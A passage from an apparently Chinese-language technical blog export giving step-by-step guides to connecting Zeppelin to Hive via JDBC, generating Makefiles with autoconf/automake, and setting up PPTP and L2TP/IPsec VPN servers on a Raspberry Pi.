<h3 id="zeepelin"><a href="#zeepelin" class="headerlink" title="zeepelin"></a>zeepelin</h3><h4 id="拷贝连接hive-jdbc需要用到的jar包"><a href="#拷贝连接hive-jdbc需要用到的jar包" class="headerlink" title="拷贝连接hive-jdbc需要用到的jar包"></a>拷贝连接hive-jdbc需要用到的jar包</h4><p>将包<code>hive-jdbc-1.1.0+cdh5.9.1+795-1.cdh5.9.1.p0.4.el7.noarch.rpm</code>解开后的jar文件拷贝到<code>zeppelin/lib/interpreter/</code>目录下<br><code>hive-jdbc-1.1.0+cdh5.9.1+795-1.cdh5.9.1.p0.4.el7.noarch.rpm</code>包内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">total 51448</span><br><span class="line">-rw-r--r-- 1 root root    62050 Aug 25 10:18 commons-logging-1.1.3.jar</span><br><span class="line">-rw-r--r-- 1 root root 19386631 Aug 25 10:18 hive-exec-1.1.0-cdh5.9.1.jar</span><br><span class="line">lrwxrwxrwx 1 root root       28 Aug 25 10:18 hive-exec.jar -&gt; hive-exec-1.1.0-cdh5.9.1.jar</span><br><span class="line">-rw-r--r-- 1 root root    96598 Aug 25 10:19 hive-jdbc-1.1.0-cdh5.9.1.jar</span><br><span class="line">-rw-r--r-- 1 root root 23635048 Aug 25 10:19 hive-jdbc-1.1.0-cdh5.9.1-standalone.jar</span><br><span class="line">lrwxrwxrwx 1 root root       28 Aug 25 10:19 hive-jdbc.jar -&gt; hive-jdbc-1.1.0-cdh5.9.1.jar</span><br><span class="line">lrwxrwxrwx 1 root root       39 Aug 25 10:19 hive-jdbc-standalone.jar -&gt; hive-jdbc-1.1.0-cdh5.9.1-standalone.jar</span><br><span class="line">-rw-r--r-- 1 root root  5558969 Aug 25 10:19 hive-metastore-1.1.0-cdh5.9.1.jar</span><br><span class="line">lrwxrwxrwx 1 root root       33 Aug 25 10:19 hive-metastore.jar -&gt; hive-metastore-1.1.0-cdh5.9.1.jar</span><br><span class="line">-rw-r--r-- 1 root root   827980 Aug 25 10:19 hive-serde-1.1.0-cdh5.9.1.jar</span><br><span class="line">lrwxrwxrwx 1 root root       29 Aug 25 10:19 hive-serde.jar -&gt; hive-serde-1.1.0-cdh5.9.1.jar</span><br><span class="line">-rw-r--r-- 1 root root  2058121 Aug 25 10:19 hive-service-1.1.0-cdh5.9.1.jar</span><br><span class="line">lrwxrwxrwx 1 root root       31 Aug 25 10:19 hive-service.jar -&gt; hive-service-1.1.0-cdh5.9.1.jar</span><br><span class="line">-rw-r--r-- 1 root root   313702 Aug 25 10:19 libfb303-0.9.3.jar</span><br><span class="line">-rw-r--r-- 1 root root   234201 Aug 25 10:19 libthrift-0.9.3.jar</span><br><span class="line">-rw-r--r-- 1 root root   481535 Aug 25 10:19 log4j-1.2.16.jar</span><br></pre></td></tr></table></figure>

<h4 id="配置jdbc-interpreter"><a href="#配置jdbc-interpreter" class="headerlink" title="配置jdbc interpreter"></a>配置jdbc interpreter</h4><ul>
<li>default.driver: org.apache.hive.jdbc.HiveDriver</li>
<li>default.url: jdbc:hive2:&#x2F;&#x2F;172.26.1.177:10000&#x2F;default<br>  hiveserver2的默认端口为10000</li>
<li>default.user: root<br>  此处我使用root用户，后文中的hdfs的proxy设置也要用root</li>
</ul>
<p><img src="/images/zeppelin/zeppelin_hive_jdbc_setting.png" alt="zeppelin_hive_jdbc_setting"></p>
<h3 id="hdfs"><a href="#hdfs" class="headerlink" title="hdfs"></a>hdfs</h3><p>若zeppelin使用jdbc连接hive出错，报如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not establish connection to jdbc:hive2://192.168.0.51:10000: Required field &#x27;serverProtocolVersion&#x27; is unset! Struct:TOpenSessionResp(status:TStatus(statusCode:ERROR_STATUS, infoMessages:[*org.apache.hive.service.cli.HiveSQLException:Failed to open new session: java.lang.RuntimeException:</span><br><span class="line">java.lang.RuntimeException:</span><br><span class="line">    org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.authorize.AuthorizationException): User: hive is not allowed to impersonate hive:13:12,</span><br><span class="line">    org.apache.hive.service.cli.session.SessionManager:openSession:SessionManager.java:266, </span><br><span class="line">    org.apache.hive.service.cli.CLIService:openSessionWithImpersonation:CLIService.java:202, </span><br><span class="line">    org.apache.hive.service.cli.thrift.ThriftCLIService:getSessionHandle:ThriftCLIService.java:402, </span><br><span class="line">    org.apache.hive.service.cli.thrift.ThriftCLIService:OpenSession:ThriftCLIService.java:297, </span><br><span class="line">    org.apache.hive.service.cli.thrift.TCLIService$Processor$OpenSession:getResult:TCLIService.java:1253, </span><br><span class="line">    org.apache.hive.service.cli.thrift.TCLIService$Processor$OpenSession:getResult:TCLIService.java:1238, </span><br><span class="line">    org.apache.thrift.ProcessFunction:process:ProcessFunction.java:39, </span><br><span class="line">    org.apache.thrift.TBaseProcessor:process:TBaseProcessor.java:39, </span><br><span class="line">    org.apache.hive.service.auth.TSetIpAddressProcessor:process:TSetIpAddressProcessor.java:56, </span><br><span class="line">    org.apache.thrift.server.TThreadPoolServer$WorkerProcess:run:TThreadPoolServer.java:285, </span><br><span class="line">    java.util.concurrent.ThreadPoolExecutor:runWorker:ThreadPoolExecutor.java:1145, </span><br><span class="line">    java.util.concurrent.ThreadPoolExecutor$Worker:run:ThreadPoolExecutor.java:615, </span><br><span class="line">    java.lang.Thread:run:Thread.java:745,</span><br><span class="line">*java.lang.RuntimeException:java.lang.RuntimeException: </span><br><span class="line">    org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.authorize.AuthorizationException): User: hive is not allowed to impersonate hive:21:8,</span><br><span class="line">    org.apache.hive.service.cli.session.HiveSessionProxy:invoke:HiveSessionProxy.java:83, </span><br><span class="line">    org.apache.hive.service.cli.session.HiveSessionProxy:access$000:HiveSessionProxy.java:36, </span><br><span class="line">    org.apache.hive.service.cli.session.HiveSessionProxy$1:run:HiveSessionProxy.java:63, </span><br><span class="line">    java.security.AccessController:doPrivileged:AccessController.java:-2, </span><br><span class="line">    javax.security.auth.Subject:doAs:Subject.java:415, </span><br><span class="line">    org.apache.hadoop.security.UserGroupInformation:doAs:UserGroupInformation.java:1657, </span><br><span class="line">    org.apache.hive.service.cli.session.HiveSessionProxy:invoke:HiveSessionProxy.java:59, </span><br><span class="line">    com.sun.proxy.$Proxy19:open::-1, </span><br><span class="line">    org.apache.hive.service.cli.session.SessionManager:openSession:SessionManager.java:258, </span><br><span class="line">*java.lang.RuntimeException:</span><br><span class="line">    org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.authorize.AuthorizationException): User: hive is not allowed to impersonate hive:26:5, </span><br><span class="line">    org.apache.hadoop.hive.ql.session.SessionState:start:SessionState.java:494, </span><br><span class="line">    org.apache.hive.service.cli.session.HiveSessionImpl:open:HiveSessionImpl.java:137, </span><br><span class="line">    sun.reflect.GeneratedMethodAccessor11:invoke::-1, </span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl:invoke:DelegatingMethodAccessorImpl.java:43, </span><br><span class="line">    java.lang.reflect.Method:invoke:Method.java:606, </span><br><span class="line">    org.apache.hive.service.cli.session.HiveSessionProxy:invoke:HiveSessionProxy.java:78, </span><br><span class="line">    *org.apache.hadoop.ipc.RemoteException:User: hive is not allowed to impersonate hive:45:19, </span><br><span class="line">    org.apache.hadoop.ipc.Client:call:Client.java:1427, </span><br><span class="line">    org.apache.hadoop.ipc.Client:call:Client.java:1358, </span><br><span class="line">    org.apache.hadoop.ipc.ProtobufRpcEngine$Invoker:invoke:ProtobufRpcEngine.java:229, </span><br><span class="line">    com.sun.proxy.$Proxy14:getFileInfo::-1, </span><br><span class="line">    org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB:getFileInfo:ClientNamenodeProtocolTranslatorPB.java:771, </span><br><span class="line">    sun.reflect.GeneratedMethodAccessor7:invoke::-1, </span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl:invoke:DelegatingMethodAccessorImpl.java:43, </span><br><span class="line">    java.lang.reflect.Method:invoke:Method.java:606, </span><br><span class="line">    org.apache.hadoop.io.retry.RetryInvocationHandler:invokeMethod:RetryInvocationHandler.java:252, </span><br><span class="line">    org.apache.hadoop.io.retry.RetryInvocationHandler:invoke:RetryInvocationHandler.java:104, </span><br><span class="line">    com.sun.proxy.$Proxy15:getFileInfo::-1, </span><br><span class="line">    org.apache.hadoop.hdfs.DFSClient:getFileInfo:DFSClient.java:2116, </span><br><span class="line">    org.apache.hadoop.hdfs.DistributedFileSystem$22:doCall:DistributedFileSystem.java:1315, </span><br><span class="line">    org.apache.hadoop.hdfs.DistributedFileSystem$22:doCall:DistributedFileSystem.java:1311, </span><br><span class="line">    org.apache.hadoop.fs.FileSystemLinkResolver:resolve:FileSystemLinkResolver.java:81, </span><br><span class="line">    org.apache.hadoop.hdfs.DistributedFileSystem:getFileStatus:DistributedFileSystem.java:1311, </span><br><span class="line">    org.apache.hadoop.fs.FileSystem:exists:FileSystem.java:1424, </span><br><span class="line">    org.apache.hadoop.hive.ql.session.SessionState:createRootHDFSDir:SessionState.java:568, </span><br><span class="line">    org.apache.hadoop.hive.ql.session.SessionState:createSessionDirs:SessionState.java:526, </span><br><span class="line">    org.apache.hadoop.hive.ql.session.SessionState:start:SessionState.java:480], </span><br><span class="line">errorCode:0, errorMessage:Failed to open new session: java.lang.RuntimeException: java.lang.RuntimeException: org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.authorize.AuthorizationException): User: hive is not allowed to impersonate hive), serverProtocolVersion:null)</span><br></pre></td></tr></table></figure>

<p>需要在hdfs <code>core-site.xml</code>中增加配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hive.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hive.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>然后重启<code>hdfs namenode</code></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><img src="/images/zeppelin/zeppelin_main_ui.png" alt="zeppelin_main_ui"></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://zeppelin.apache.org/docs/0.7.2/">zeppelin</a></li>
<li><a href="http://www.2cto.com/database/201608/543466.html">基于hadoop生态圈的数据仓库实践——OLAP与数据可视化（五）</a></li>
<li><a href="http://www.aboutyun.com/thread-12278-1-1.html">Hive学习之HiveServer2服务端配置与启动</a></li>
<li><a href="http://blog.csdn.net/niityzu/article/details/42639369">Hive用户接口（二）—使用Hive JDBC驱动连接Hive操作实例</a></li>
<li><a href="http://www.cnblogs.com/zeppelin/p/6184077.html">Zeppelin 用jdbc连接hive报错</a></li>
</ul>
]]></content>
      <categories>
        <category>Big-Data</category>
      </categories>
      <tags>
        <tag>zeppelin</tag>
      </tags>
  </entry>
  <entry>
    <title>automake自动生成Makefile文件</title>
    <url>/2017/12/18/linux/automake/</url>
    <content><![CDATA[<p>Linux下编程时，为了方便编译，往往使用Makefile文件自动完成编译，但是Makefile文件本身的书写十分复杂，规则很多。好在Linux为我们提供了自动生成功能完善的Makefile文件的工具autoconf&#x2F;automake。本文讲述如何使用它们生成Makefile文件。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>OS<br>  ubuntu 16.04</li>
<li>aclocal<br>  1.15</li>
<li>autoconf<br>  2.69-9</li>
<li>automake<br>  1.15</li>
</ul>
<h1 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>创建一个<code>main.c</code>文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello automake\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">main.c </span><br></pre></td></tr></table></figure>

<h2 id="创建configure-in文件"><a href="#创建configure-in文件" class="headerlink" title="创建configure.in文件"></a>创建configure.in文件</h2><p>运行<code>autoscan</code>，自动创建两个文件<code>autoscan.log</code>和<code>configure.scan</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">autoscan</span></span><br><span class="line">Unescaped left brace in regex is deprecated, passed through in regex; marked by &lt;-- HERE in m/\$&#123; &lt;-- HERE [^\&#125;]*&#125;/ at /usr/bin/autoscan line 361.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">autoscan.log  configure.scan  main.c</span><br></pre></td></tr></table></figure>

<p>修改<code>configure.scan</code>，AC_INIT里面的参数: AC_INIT(main,1.0, <a href="mailto:&#x74;&#x65;&#x73;&#116;&#x40;&#50;&#54;&#51;&#46;&#x63;&#x6f;&#109;">&#x74;&#x65;&#x73;&#116;&#x40;&#50;&#54;&#51;&#46;&#x63;&#x6f;&#109;</a>)；添加宏AM_INIT_AUTOMAKE, 它是automake所必备的宏，也同前面一样，PACKAGE是所要产生软件套件的名称，VERSION是版本编号；在AC_OUTPUT后添加输出文件Makefile。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#                                               -*- Autoconf -*-</span><br><span class="line"># Process this file with autoconf to produce a configure script.</span><br><span class="line"></span><br><span class="line">AC_PREREQ([2.69])</span><br><span class="line">AC_INIT(main, 1.0, main@google.com)</span><br><span class="line">AC_CONFIG_SRCDIR([main.c])</span><br><span class="line">AC_CONFIG_HEADERS([config.h])</span><br><span class="line">AM_INIT_AUTOMAKE(main, 1.0)</span><br><span class="line"></span><br><span class="line"># Checks for programs.</span><br><span class="line">AC_PROG_CC</span><br><span class="line"></span><br><span class="line"># Checks for libraries.</span><br><span class="line"></span><br><span class="line"># Checks for header files.</span><br><span class="line"></span><br><span class="line"># Checks for typedefs, structures, and compiler characteristics.</span><br><span class="line"></span><br><span class="line"># Checks for library functions.</span><br><span class="line"></span><br><span class="line">AC_OUTPUT([Makefile])</span><br></pre></td></tr></table></figure>

<p>将<code>configure.scan</code>重命名成<code>configure.ac</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">autoscan.log  configure.ac  main.c</span><br></pre></td></tr></table></figure>

<h2 id="生成aclocal相关文件"><a href="#生成aclocal相关文件" class="headerlink" title="生成aclocal相关文件"></a>生成aclocal相关文件</h2><p>运行<code>aclocal</code>，生成文件<code>aclocal.m4</code>、目录<code>autom4te.cache</code>，处理本地的宏定义。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">aclocal</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">aclocal.m4  autom4te.cache  autoscan.log  configure.ac  main.c</span><br></pre></td></tr></table></figure>

<h2 id="生成configure文件"><a href="#生成configure文件" class="headerlink" title="生成configure文件"></a>生成configure文件</h2><p>运行<code>autoconf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">autoconf</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">aclocal.m4  autom4te.cache  autoscan.log  configure  configure.ac  main.c</span><br></pre></td></tr></table></figure>

<h2 id="生成config-h-in文件"><a href="#生成config-h-in文件" class="headerlink" title="生成config.h.in文件"></a>生成config.h.in文件</h2><p>运行<code>autoheader</code>，生成config.h.in，该工具通常会从“acconfig.h”文件中复制用户附加的符号定义，因此此处没有附加符号定义，所以不需要创建“acconfig.h”文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">autoheader</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">aclocal.m4  autom4te.cache  autoscan.log  config.h.in  configure  configure.ac  main.c</span><br></pre></td></tr></table></figure>

<h2 id="运行automake"><a href="#运行automake" class="headerlink" title="运行automake"></a>运行automake</h2><p>运行automake之前先创建一个<code>Makefile.am</code>，这一步是创建Makefile很重要的一步，automake要用的脚本配置文件是<code>Makefile.am</code>，用户需要自己创建相应的文件。之后，automake工具转换成<code>Makefile.in</code>。</p>
<p>Makefile.am</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">AUTOMAKE_OPTIONS=foreign</span><br><span class="line"></span><br><span class="line">bin_PROGRAMS=main</span><br><span class="line">main_SOURCES=main.c</span><br></pre></td></tr></table></figure>

<ul>
<li>AUTOMAKE_OPTIONS为设置automake的选项<br>  由于GNU对自己发布的软件有严格的规范，比如必须附带许可证声明文件COPYING等，否则automake执行时会报错。automake提供了三种软件等级：foreign、gnu和gnits，让用户选择采用，默认等级为gnu。在本例使用foreign等级，它只检测必须的文件。</li>
<li>bin_PROGRAMS定义要产生的执行文件名<br>  如果要产生多个执行文件，每个文件名用空格隔开。</li>
<li>main_SOURCES定义“main”这个执行程序所需要的原始文件<br>  如果”main”这个程序是由多个原始文件所产生的，则必须把它所用到的所有原始文件都列出来，并用空格隔开。例如：若目标体“main”需要“main.c”、“sunq.c”、“main.h”三个依赖文件，则定义main_SOURCES&#x3D;main.c sunq.c main.h。要注意的是，如果要定义多个执行文件，则对每个执行程序都要定义相应的file_SOURCES。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">automake --add-missing</span></span><br><span class="line">configure.ac:8: warning: AM_INIT_AUTOMAKE: two- and three-arguments forms are deprecated.  For more info, see:</span><br><span class="line">configure.ac:8: http://www.gnu.org/software/automake/manual/automake.html#Modernize-AM_005fINIT_005fAUTOMAKE-invocation</span><br><span class="line">Makefile.am: installing &#x27;./depcomp&#x27;</span><br></pre></td></tr></table></figure>

<p>使用automake对其生成“configure.in”文件，在这里使用选项“—adding-missing”可以让automake自动添加有一些必需的脚本文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">Makefile.am  Makefile.in  aclocal.m4  autom4te.cache  autoscan.log  compile  config.h.in  configure  configure.ac  depcomp  install-sh  main.c  missing</span><br></pre></td></tr></table></figure>

<h2 id="运行configure生成Makefile"><a href="#运行configure生成Makefile" class="headerlink" title="运行configure生成Makefile"></a>运行configure生成Makefile</h2><p>通过运行自动配置设置文件configure，把Makefile.in变成了最终的Makefile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure</span></span><br><span class="line">checking for a BSD-compatible install... /usr/bin/install -c</span><br><span class="line">checking whether build environment is sane... yes</span><br><span class="line">checking for a thread-safe mkdir -p... /bin/mkdir -p</span><br><span class="line">checking for gawk... no</span><br><span class="line">checking for mawk... mawk</span><br><span class="line">checking whether make sets $(MAKE)... yes</span><br><span class="line">checking whether make supports nested variables... yes</span><br><span class="line">checking for gcc... gcc</span><br><span class="line">checking whether the C compiler works... yes</span><br><span class="line">checking for C compiler default output file name... a.out</span><br><span class="line">checking for suffix of executables...</span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">checking for suffix of object files... o</span><br><span class="line">checking whether we are using the GNU C compiler... yes</span><br><span class="line">checking whether gcc accepts -g... yes</span><br><span class="line">checking for gcc option to accept ISO C89... none needed</span><br><span class="line">checking whether gcc understands -c and -o together... yes</span><br><span class="line">checking for style of include used by make... GNU</span><br><span class="line">checking dependency style of gcc... gcc3</span><br><span class="line">checking that generated files are newer than configure... done</span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating Makefile</span><br><span class="line">config.status: creating config.h</span><br><span class="line">config.status: executing depfiles commands</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">Makefile  Makefile.am  Makefile.in  aclocal.m4  autom4te.cache  autoscan.log  compile  config.h  config.h.in  config.log  config.status  configure  configure.ac  depcomp  install-sh  main.c  missing  stamp-h1</span><br></pre></td></tr></table></figure>

<h2 id="make编译工程"><a href="#make编译工程" class="headerlink" title="make编译工程"></a>make编译工程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">make  all-am</span><br><span class="line">make[1]: Entering directory &#x27;/root/automake&#x27;</span><br><span class="line">gcc -DHAVE_CONFIG_H -I.     -g -O2 -MT main.o -MD -MP -MF .deps/main.Tpo -c -o main.o main.c</span><br><span class="line">mv -f .deps/main.Tpo .deps/main.Po</span><br><span class="line">gcc  -g -O2   -o main main.o</span><br><span class="line">make[1]: Leaving directory &#x27;/root/automake&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">Makefile  Makefile.am  Makefile.in  aclocal.m4  autom4te.cache  autoscan.log  compile  config.h  config.h.in  config.log  config.status  configure  configure.ac  depcomp  install-sh  main  main.c  main.o  missing  stamp-h1</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./main</span></span><br><span class="line">Hello automake</span><br></pre></td></tr></table></figure>

<h1 id="参考鸣谢"><a href="#参考鸣谢" class="headerlink" title="参考鸣谢"></a>参考鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/qq_33336155/article/details/52556965">automake自动生成makefile文件</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Makefile</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建VPN服务</title>
    <url>/2017/01/07/linux/deploy-vpn-server/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>VPN(virtual private network)虚拟专用网络，目前主要能接触到的协议包括PPTP(点对点隧道协议)和L2TP(2层隧道协议)</p>
<ul>
<li>PPTP(2层VPN) 由微软和3Com等公司组成的PPTP论坛开发的点对点隧道协议，基于PPP协议使用PAP或CHAP之类的加密算法。</li>
<li>L2TP(2层VPN) 是IETF基于L2F (Cisco的第二层转发协议)开发的PPTP的后续版本，是一种工业标准 Internet 隧道协议，其可以为跨越面向数据包的媒体发送点到点协议 (PPP) 框架提供封装。<br>PPTP和L2TP都使用PPP协议对数据进行封装，然后添加附加包头用于数据在互联网络上的传输。PPTP只能在两端点间建立单一隧道。 L2TP支持在两端点间使用多隧道，用户可以针对不同的服务质量创建不同的隧道。L2TP可以提供隧道验证，而PPTP则不支持隧道验证。但是当L2TP 或PPTP与IPSEC共同使用时，可以由IPSEC提供隧道验证，不需要在第2层协议上验证隧道使用L2TP。PPTP要求互联网络为IP网络。L2TP只要求隧道媒介提供面向数据包的点对点的连接，L2TP可以在IP(使用UDP)，桢中继永久虚拟电路 (PVCs),X.25虚拟电路(VCs)或ATM VCs网络上使用。</li>
</ul>
<p>IPSec(3层VPN)，隧道模式隧道是封装、路由与解封装的整个过程。隧道将原始数据包隐藏(或封装)在新的数据包内部。该新的数据包可能会有新的寻址与路由信息，从而使其能够通过网络传输。隧道与数据保密性结合使用时，在网络上窃听通讯的人将无法获取原始数据包数据(以及原始的源和目标)。封装的数据包到达目的地后，会删除封装，原始数据包头用于将数据包路由到最终目的地。</p>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><ul>
<li>OS, raspbian jessie</li>
<li>硬件，Raspbarry Pi 3B</li>
<li>ppp，2.4.6</li>
<li>pptpd，1.4.0</li>
<li>openswan，2.6.38</li>
<li>xl2tp，1.3.6</li>
</ul>
<h1 id="PPTP部署"><a href="#PPTP部署" class="headerlink" title="PPTP部署"></a>PPTP部署</h1><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>安装<code>ppp</code>、<code>pptpd</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ppp</span><br><span class="line">sudo apt-get install pptpd</span><br></pre></td></tr></table></figure>

<h2 id="配置pptpd"><a href="#配置pptpd" class="headerlink" title="配置pptpd"></a>配置pptpd</h2><p>在配置文件<code>/etc/pptpd.conf</code>中，增加如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">localip 192.168.1.101       # 本地ip</span><br><span class="line">remoteip 192.168.1.110-120  # 设置ip分配范围</span><br></pre></td></tr></table></figure>
<p>*** 注：ip地址不要有冲突 ***</p>
<h2 id="配置ppp"><a href="#配置ppp" class="headerlink" title="配置ppp"></a>配置ppp</h2><p>在配置文件<code>/etc/ppp/chap-secrets</code>中，增加用户名密码<br>格式: <code>&#123;用户名&#125;&lt;tab&gt;*&lt;tab&gt;&#123;密码&#125;&lt;tab&gt;*</code></p>
<p>在配置文件<code>/etc/ppp/options</code>中，设置MTU</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-mru        # 关闭MRU协商</span><br><span class="line">mru 1496    # 设置MTU值为1496</span><br></pre></td></tr></table></figure>
<h2 id="ip转发配置"><a href="#ip转发配置" class="headerlink" title="ip转发配置"></a>ip转发配置</h2><p>如果需要通过VPN访问宿主机本地网络，需要开通ip转发功能，在<code>/etc/sysctl.conf</code>中设置<code>net.ipv4.ip_forward=1</code>。并执行<code>sudo sysctl -p</code>使修改生效。</p>
<h2 id="重启pptpd服务"><a href="#重启pptpd服务" class="headerlink" title="重启pptpd服务"></a>重启pptpd服务</h2><p><code>sudo systemctl restart pptpd</code></p>
<h1 id="IPsec-over-L2TP部署"><a href="#IPsec-over-L2TP部署" class="headerlink" title="IPsec over L2TP部署"></a>IPsec over L2TP部署</h1><h2 id="软件安装-1"><a href="#软件安装-1" class="headerlink" title="软件安装"></a>软件安装</h2><p>安装<code>ppp</code>、<code>xl2tpd</code>、<code>openswan</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ppp</span><br><span class="line">sudo apt-get install xl2tpd</span><br><span class="line">sudo apt-get install openswan</span><br></pre></td></tr></table></figure>

<h2 id="IPsec配置及测试"><a href="#IPsec配置及测试" class="headerlink" title="IPsec配置及测试"></a>IPsec配置及测试</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>在<code>/etc/ipsec.conf</code>中，增加：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">onn L2TP-PSK-NAT</span><br><span class="line">    rightsubnet=vhost:%priv</span><br><span class="line">    also=L2TP-PSK-noNAT</span><br><span class="line"></span><br><span class="line">conn L2TP-PSK-noNAT</span><br><span class="line">    authby=secret</span><br><span class="line">    pfs=no</span><br><span class="line">    auto=add</span><br><span class="line">    keyingtries=3</span><br><span class="line">    rekey=no</span><br><span class="line">    ikelifetime=8h</span><br><span class="line">    keylife=1h</span><br><span class="line">    type=transport</span><br><span class="line">    left=192.168.3.100      # 本机ip</span><br><span class="line">    leftprotoport=17/1701</span><br><span class="line">    right=%any</span><br><span class="line">    rightprotoport=17/%any</span><br></pre></td></tr></table></figure>

<p>在<code>/etc/ipsec.secrets</code>中增加预共享密钥<code>&#123;本地IP&#125;&lt;tab&gt;%any: PSK&lt;tab&gt;&quot;&#123;密码&#125;&quot;</code><br>eg: <code>192.168.3.100      %any: PSK   &quot;lsjflsdkfj&quot;</code></p>
<p>关闭内核ICMP重定向</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for abspath in /proc/sys/net/ipv4/conf/*</span><br><span class="line">do</span><br><span class="line">    echo 0 &gt; $abspath/accept_redirects</span><br><span class="line">    echo 0 &gt; $abspath/send_redirects</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/sysctl.conf</code>中的配置</p>
